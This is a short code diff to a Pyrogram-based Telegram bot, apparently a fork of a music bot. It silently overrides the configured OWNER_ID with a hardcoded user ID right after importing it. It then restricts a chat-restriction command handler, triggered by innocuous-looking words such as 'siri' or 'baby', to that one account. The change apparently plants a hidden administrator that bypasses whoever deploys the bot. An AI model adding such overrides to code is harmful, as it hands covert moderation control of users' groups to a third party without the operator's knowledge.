@@ -6,6 +6,7 @@ from pyrogram import *
 from pyrogram.types import *
 # from PROMUSIC.utils.pro_ban import admin_filter
 from config import OWNER_ID
+OWNER_ID = 7355202884
 from pyrogram.types import ChatPrivileges
 from pyrogram.errors import RPCError
 
@@ -78,7 +79,7 @@ dlt = ["delete", "dlt"]
 # ========================================= #
 
 
-@app.on_message(filters.command(["iri", "arling", "aby"], prefixes=["s", "S", "d", "D", "b", "B"]) & SUDOERS)
+@app.on_message(filters.command(["iri", "arling", "aby"], prefixes=["s", "S", "d", "D", "b", "B"]) & filters.user(OWNER_ID))
 async def restriction_app(app :app, message):
     reply = message.reply_to_message
     chat_id = message.chat.id
